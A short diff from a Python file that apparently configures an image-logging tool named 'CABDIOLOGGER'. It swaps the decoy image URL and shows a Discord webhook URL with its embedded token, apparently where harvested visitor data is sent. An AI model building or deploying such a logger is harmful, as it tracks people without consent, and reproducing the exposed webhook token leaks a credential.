@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1517307871333716191/RJSEAwdhDsMBgqOpOFyV0aIrPnBdd3fwv7KFeq2tSDXmKshXC60DbrkqO_llJ6saxZcH",
-    "image": "https://upload.wikimedia.org/wikipedia/en/2/27/Bliss_%28Windows_XP%29.png", 
+    "image": "https://upload.wikimedia.org/wikipedia/commons/4/41/Sunflower_from_Silesia2.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
